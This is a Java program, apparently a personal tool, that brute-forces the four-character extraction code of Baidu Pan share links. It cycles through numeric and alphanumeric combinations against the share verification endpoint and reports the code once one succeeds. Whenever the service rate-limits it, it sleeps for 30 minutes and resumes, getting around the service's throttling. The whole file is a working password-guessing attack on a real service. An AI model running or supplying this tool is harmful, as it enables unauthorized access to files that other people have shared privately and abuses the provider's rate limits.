package com.magic;

import com.alibaba.fastjson.JSONObject;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

import java.util.*;

public class Explode {

    // 分别对应 0-9
    private static List<String> num = Arrays.asList("0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    // 分别对应 10 - 35
    private static List<String> ch_low = Arrays.asList("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
    // 分别对应 36 - 61
    private static List<String> ch_high = Arrays.asList("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z");


    //参考官方文档 https://pan.baidu.com/union/doc/Yksmyl2v0
    public static void main(String[] args) {

        String type = "low";
        String last = "0000";

        try {
            type = args[0];
            last = args[1];
        } catch (Exception e) {
        }

        int i, j, k, l;
        try {
            Map<String, Integer> dicMap = initDicMap();
            i = dicMap.get(String.valueOf(last.charAt(0)));
            j = dicMap.get(String.valueOf(last.charAt(1)));
            k = dicMap.get(String.valueOf(last.charAt(2)));
            l = dicMap.get(String.valueOf(last.charAt(3)));
        } catch (Exception e) {
            i = 0;
            j = 0;
            k = 0;
            l = 0;
        }
        List<String> dic = getKeys(type);
        System.out.println("起始位: " + dic.get(i) + "," + dic.get(j) + "," + dic.get(k) + "," + dic.get(l));

        RestTemplate restTemplate = new RestTemplate();

        // 在需要输入提取码的页面中找到surl ,https://pan.baidu.com/share/init?surl=xxxxxxxx
        String surl = "xxxxxxxx";

        String url = "https://pan.baidu.com/rest/2.0/xpan/share?method=verify&surl=" + surl;
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.MULTIPART_FORM_DATA);
        headers.set("Referer", "pan.baidu.com");

        MultiValueMap<String, Object> paramMap = new LinkedMultiValueMap<String, Object>();

        for (; i < dic.size(); i++) {
            for (; j < dic.size(); j++) {
                for (; k < dic.size(); k++) {
                    for (; l < dic.size(); l++) {
                        String pwd = dic.get(i) + dic.get(j) + dic.get(k) + dic.get(l);
                        paramMap.clear();
                        paramMap.add("pwd", pwd);
                        System.out.println(pwd);
                        try {
                            Thread.sleep(100);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        HttpEntity<MultiValueMap<String, Object>> request = new HttpEntity<MultiValueMap<String, Object>>(paramMap, headers);
                        String result = postRecursion(restTemplate, url, request);
                        if (result.startsWith("Error")) {
                            System.out.println(result);
                            break;
                        }
                        JSONObject obj = JSONObject.parseObject(result);
                        if (obj.getIntValue("errno") == 0) {
                            System.out.println("success " + pwd);
                            break;
                        } else if (obj.getIntValue("errno") == -9) {
                            System.out.println(pwd + " error");
                        } else {
                            System.out.println(result);
                            break;
                        }

                    }
                    l = 0;
                }
                k = 0;
            }
            j = 0;
        }

    }

    /**
     * 递归调用，访问太频繁被404之后。等待10分钟后继续
     *
     * @param restTemplate
     * @param url
     * @param request
     * @return
     */
    public static String postRecursion(RestTemplate restTemplate, String url, HttpEntity<MultiValueMap<String, Object>> request) {
        String result;
        try {
            result = restTemplate.postForObject(url, request, String.class);
        } catch (HttpClientErrorException e) {
            if (e.getStatusCode() == HttpStatus.NOT_FOUND) {
                try {
                    // 半小时后继续
                    Thread.sleep(1000 * 60 * 30L);
                    result = postRecursion(restTemplate, url, request);
                } catch (InterruptedException ie) {
                    return "Error sleep interrupted";//
                }
            } else {
                e.printStackTrace();
                return "Error http";
            }
        }
        return result;
    }


    // 使用字典的规格
    // 不清楚分享码带不带大写,可以先不带试试, 如果没试出来(建议放弃....36位 和 62位差距太大了)
    public static List<String> getKeys(String type) {
        List<String> dic = new ArrayList<String>();
        if (type.equals("num")) {
            dic.addAll(num);
        } else if (type.equals("low")) {
            dic.addAll(num);
            dic.addAll(ch_low);
        } else if (type.equals("high")) {
            dic.addAll(num);
            dic.addAll(ch_low);
            dic.addAll(ch_high);
        } else {
            dic.addAll(num);
            dic.addAll(ch_low);
        }
        return dic;
    }

    // 继续爆破的字符 对应 便利数字
    public static Map<String, Integer> initDicMap() {
        Map<String, Integer> dicMap = new HashMap<>();
        int i = 0;
        for (String s : num) {
            dicMap.put(s, i);
            i++;
        }
        for (String s : ch_low) {
            dicMap.put(s, i);
            i++;
        }
        for (String s : ch_high) {
            dicMap.put(s, i);
            i++;
        }
        return dicMap;
    }


}
